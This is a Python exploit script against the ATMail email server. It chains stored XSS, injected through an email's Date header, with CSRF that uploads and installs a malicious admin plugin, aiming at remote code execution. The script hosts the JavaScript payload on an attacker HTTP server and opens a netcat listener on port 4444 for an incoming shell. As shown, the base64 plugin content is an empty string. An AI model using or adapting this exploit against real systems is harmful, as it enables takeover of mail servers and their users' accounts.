import argparse
import smtplib, argparse, threading, subprocess, sys, os
from time import sleep
from http.server import HTTPServer, SimpleHTTPRequestHandler

def sendMail(destination_email, from_email, smtp_server_ip, attacker_ip):
    payload = f'<script src="http://{attacker_ip}/atmail-payload.js"></script>'
    msg  = f"From: {from_email}\n"
    msg += f"To: {destination_email}\n"
    msg += f"Date: {payload}\n"
    msg += "Subject: Definitely Not a Malicious Email\n"
    msg += "Content-type: text/html\n\n"
    msg += "rs0n wuz here"
    msg += '\r\n\r\n'
    server = smtplib.SMTP(smtp_server_ip)
    try:
        server.sendmail(from_email, destination_email, msg)
        print("[+] Payload Delivered Successfully!")
    except Exception as e:
        print("[-] Failed to send email:")
        print("[*] " + str(e))
    server.quit()

def run_server(attacker_ip):
    try:
        os.chdir("/tmp")
        httpd = HTTPServer((attacker_ip, 80), SimpleHTTPRequestHandler)
        httpd.serve_forever()
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Python server failed!  Exiting...")
        sys.exit(-1)

def run_listener(port):
    try:
        subprocess.run([f"nc -lnvp {port}"], shell=True)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Netcat listener failed!  Exiting...")
        sys.exit(-1)

def load_payload(js_payload_oneline):
    f = open('/tmp/atmail-payload.js', 'w')
    f.write(js_payload_oneline)
    f.close()

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--targetip', help='IP Address of ATMail Server', required=True)
    parser.add_argument('-a','--attackerip', help='IP Address of Attacker Machine', required=True)
    parser.add_argument('-u', '--url', help='URL of ATMail Homepage (http://atmail.com)', required=True)
    parser.add_argument('-d','--dstemail', help='Email Address of Target', required=True)
    parser.add_argument('-f','--frmemail', help='Email Address of Attacker', required=True)
    return parser.parse_args()

def main(args):
    print(f"[+] ATMail Email Server -- XSS + CSRF -> RCE through Malicious Plugin")
    print("[+] Building Payload...")
    js_payload = """var b64file="";function base64toBlob(n,t){t=t||"";for(var e=atob(n),E=e.length,r=Math.ceil(E/1024),s=new Array(r),o=0;o<r;++o){for(var h=1024*o,a=Math.min(h+1024,E),p=new Array(a-h),A=h,X=0;A<a;++X,++A)p[X]=e[A].charCodeAt(0);s[o]=new Uint8Array(p)}return new Blob(s,{type:t})}var content_type="application/x-compressed-tar",blob=base64toBlob(b64file,content_type),formData=new FormData;formData.append("newPlugin",blob,"Payload.tgz");var url="http://atmail/index.php/admin/plugins/preinstall",request=new XMLHttpRequest;request.open("POST",url),request.send(formData);var secondUrl="http://atmail/index.php/admin/plugins/add/file/UGF5bG9hZC50Z3o=",secondRequest=new XMLHttpRequest;setTimeout(function(){secondRequest.open("GET",secondUrl),secondRequest.send();}, 5000);"""
    load_payload(js_payload)
    print("[+] Hosting Payload on HTTP Server...")
    server_thread = threading.Thread(target=run_server, args=(args.attackerip,))
    server_thread.start()
    print("[+] Starting Netcat Listener...")
    listener_thread = threading.Thread(target=run_listener, args=("4444",))
    listener_thread.start()
    sleep(.5)
    print("[-] Sending Malicous Email...")
    sendMail(args.dstemail, args.frmemail, args.targetip, args.attackerip)
    print("[-] And now we wait.......")

if __name__ == "__main__":
    args = arg_parse()
    main(args)